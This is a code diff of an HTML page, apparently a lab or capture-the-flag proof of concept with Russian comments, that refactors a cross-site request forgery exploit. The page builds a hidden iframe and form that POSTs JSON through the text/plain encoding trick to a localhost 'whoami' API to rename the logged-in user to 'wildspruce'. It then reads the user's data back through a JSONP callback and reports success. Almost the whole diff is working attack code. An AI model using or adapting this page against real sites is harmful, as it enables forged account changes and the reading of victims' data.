@@ -4,52 +4,64 @@
   <title>Redirect</title>
 </head>
 <body>
-  <iframe name="hiddenFrame" style="display:none;"></iframe>
-
-  <form id="postForm" method="POST" action="http://localhost:8000/api/whoami" target="hiddenFrame" enctype="text/plain">
-    <input type="hidden" name='{"new_username":"wildspruce","ignore":"' value='"}'>
-  </form>
+  <div id="log"></div>
 
   <script>
+    function log(msg) {
+      document.getElementById('log').innerHTML += '<p>' + msg + '</p>';
+    }
+
     function exploit(data) {
       console.log("[EXPLOIT] User data BEFORE:", data);
 
-      // Сохраняем ссылку на форму ДО изменения innerHTML
-      const form = document.getElementById('postForm');
-      const iframe = document.getElementsByName('hiddenFrame')[0];
-
-      document.body.innerHTML = '<h1 style="color:red;">EXPLOIT STARTED (GUEST MODE)</h1>';
-      document.body.innerHTML += '<p>Username before: ' + data.username + '</p>';
-      document.body.innerHTML += '<p>Role: ' + data.role + '</p>';
-
-      // Возвращаем форму и iframe в DOM
-      document.body.appendChild(iframe);
-      document.body.appendChild(form);
+      log('<h1 style="color:red;">EXPLOIT STARTED (GUEST MODE)</h1>');
+      log('Username before: ' + data.username);
+      log('Role: ' + data.role);
 
       // Шаг 1: Переход на #/sheets
       window.location.hash = '#/sheets';
-      document.body.innerHTML += '<p>✓ Step 1: Navigated to #/sheets</p>';
+      log('✓ Step 1: Navigated to #/sheets');
+
+      // Создаем iframe и форму динамически
+      const iframe = document.createElement('iframe');
+      iframe.name = 'hiddenFrame';
+      iframe.style.display = 'none';
+      document.body.appendChild(iframe);
+
+      const form = document.createElement('form');
+      form.method = 'POST';
+      form.action = 'http://localhost:8000/api/whoami';
+      form.target = 'hiddenFrame';
+      form.enctype = 'text/plain';
+
+      const input = document.createElement('input');
+      input.type = 'hidden';
+      input.name = '{"new_username":"wildspruce","ignore":"';
+      input.value = '"}';
+      form.appendChild(input);
+
+      document.body.appendChild(form);
 
       setTimeout(() => {
-        // Шаг 2: Отправляем форму с JSON через text/plain trick
+        // Шаг 2: Отправляем форму
         console.log("[EXPLOIT] Submitting form...");
         form.submit();
-        document.body.innerHTML += '<p>✓ Step 2: Form submitted</p>';
+        log('✓ Step 2: Form submitted');
 
         setTimeout(() => {
           // Шаг 3: Проверяем через JSONP, изменился ли username
           window.checkResult = function(updatedData) {
             console.log("[EXPLOIT] User data AFTER:", updatedData);
-            document.body.innerHTML += '<h2 style="color:green;">✓ Username after: ' + updatedData.username + '</h2>';
+            log('<h2 style="color:green;">✓ Username after: ' + updatedData.username + '</h2>');
 
             // Шаг 4: Переход на #/settings
             window.location.hash = '#/settings';
-            document.body.innerHTML += '<p>✓ Step 3: Navigated to #/settings</p>';
+            log('✓ Step 3: Navigated to #/settings');
 
             if (updatedData.username === 'wildspruce') {
-              document.body.innerHTML += '<h2 style="color:green;">🎉 EXPLOIT COMPLETE! 🎉</h2>';
+              log('<h2 style="color:green;">🎉 EXPLOIT COMPLETE! 🎉</h2>');
             } else {
-              document.body.innerHTML += '<h2 style="color:red;">EXPLOIT FAILED - username not changed</h2>';
+              log('<h2 style="color:red;">EXPLOIT FAILED - username not changed</h2>');
             }
           };
 
